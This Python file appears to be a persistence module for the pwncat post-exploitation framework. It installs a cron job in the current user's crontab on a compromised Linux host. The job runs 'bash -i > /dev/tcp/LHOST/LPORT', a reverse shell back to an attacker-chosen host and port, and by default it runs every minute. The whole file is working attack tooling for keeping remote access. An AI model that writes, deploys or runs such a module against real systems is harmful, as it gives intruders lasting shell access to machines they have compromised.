#!/usr/bin/env python3
import pwncat, random
from crontab import CronTab
from pwncat.modules import Argument, Status, PersistType, PersistError
from pwncat.modules.persist import PersistModule

class Module(PersistModule):
    """ Install a reverse shell (executed by /bin/bash) in the current user's crontab """
    TYPE = PersistType.REMOTE
    ARGUMENTS = {
            **PersistModule.ARGUMENTS,
            "lhost": Argument(
                str, help="The host to call back to"
                ),
            "lport": Argument(
                int, default=4444, help="The port to call back to"
                ),
            "schedule": Argument(
                str, default="* * * * *", help="The cron schedule"
                ),
            "shell": Argument(
                str, default="current", help="The shell to assign for the user"
                ),
            }
    PLATFORM = pwncat.platform.Platform.LINUX

    def install(self, user, lhost, lport, schedule, shell):
        if shell == "current":
            shell = pwncat.victim.shell  
        
        try:
            randint = random.randint(1024, 65535)
            cron = CronTab(user=True)
            job = cron.new(command='echo ' + str(randint))
            job.minute.every(1)
            cron.write()
        except (PermissionError) as exc:
            raise PersistError(str(exc))
        
        cron.remove(job)
        cron.write()
        
        if schedule != "" and lhost != "" and lport != "":
            cron = CronTab(user=True)
            payload = str("bash -c 'bash -i > /dev/tcp/" + str(lhost) + "/" + str(lport) + " 2>&1'")
            job = cron.new(command=payload)
            c = 0
            for number in schedule.split():
                if number != str("*"):
                    if c == 0:
                        job.minute.every(schedule.split()[0]) # 0-59
                    if c == 1:
                        job.hour.every(schedule.split()[1]) # 0-23
                    if c == 2:
                        job.day.on(schedule.split()[2]) # 1-31
                    if c == 3:
                        job.month.on(schedule.split()[3]) # 1-12
                    if c == 4:
                        job.dow.on(schedule.split()[4]) # 0-6 (0 = Sunday)
                    c += 1
                    # if number = * then do not set, the crontab module assumes that as default
            cron.write()
            yield Status("Installed the following cron: " + str(schedule) + str(payload))